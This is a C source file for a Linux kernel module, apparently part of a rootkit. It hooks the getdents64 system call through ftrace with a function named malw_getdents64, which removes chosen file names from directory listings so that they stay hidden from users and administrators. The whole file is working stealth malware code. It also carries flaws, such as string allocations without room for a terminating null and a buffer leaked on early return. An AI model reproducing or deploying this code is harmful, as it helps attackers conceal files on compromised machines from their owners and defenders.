#include "getdents.h"
#include "ftrace_helper.h"

#define PREFIX "1337_"

int dent_size = 0;

char **hidden_dents;

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

struct ftrace_hook hook_getdents = HOOK("__x64_sys_getdents64", malw_getdents64, &orig_getdents64);

void add_hidden_dent(char *dent) 
{
	dent_size++;
	hidden_dents = krealloc(hidden_dents, dent_size*sizeof(char *), GFP_KERNEL);
	*(hidden_dents + dent_size - 1) = (char *) kmalloc(strlen(dent)*sizeof(char), GFP_KERNEL);
	strncpy(*(hidden_dents + dent_size - 1), dent, strlen(dent));
}

void remove_hidden_dent(char *dent) 
{
	int i;
	int move = 0;

	for (i = 0; i < dent_size; i++) {
		if (memcmp(*(hidden_dents + i), dent, strlen(*(hidden_dents + i))) == 0) {
			move = 1;
		}
		if (move && i + 1 < dent_size) {                                
			int size = strlen(*(hidden_dents + i + 1));                                   
			*(hidden_dents + i) = krealloc(*(hidden_dents + i), (size + 1)*sizeof(char), GFP_KERNEL);          
			memset(*(hidden_dents + i), 0, (size + 1));                                   
			strncpy(*(hidden_dents + i), *(hidden_dents + i + 1), size);                          
		}     
	}

	if (dent_size > 0 && move) {
		dent_size--;
		kfree(*(hidden_dents + dent_size));
		hidden_dents = krealloc(hidden_dents, dent_size*sizeof(char *), GFP_KERNEL);
	}
}

void install_getdents_hook(void) {
	fh_install_hook(&hook_getdents);
}

void remove_getdents_hook(void) {
	int i;
	fh_remove_hook(&hook_getdents);
	for (i = 0; i < dent_size; i++) {
		kfree(*(hidden_dents + i));
	}
	kfree(hidden_dents);
}

asmlinkage int malw_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

	long error;
	int i;
	int match = 0;

	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
	unsigned long offset = 0;

	int ret = orig_getdents64(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ((ret <= 0) || (dirent_ker == NULL))
		return ret;

	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;
	
	while (offset < ret) {
		match = 0;
		current_dir = (void *)dirent_ker + offset;
		for (i = 0; i < dent_size; i++) {
			if ( memcmp(*(hidden_dents + i), current_dir->d_name, strlen(*(hidden_dents + i))) == 0) {
				match = 1;
			}
		}

		if (match) {
			if ( current_dir == dirent_ker ) {
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
		} else {
			previous_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}

	error = copy_to_user(dirent, dirent_ker, ret);
	if (error)
		goto done;

done:
	kfree(dirent_ker);
	return ret;

}
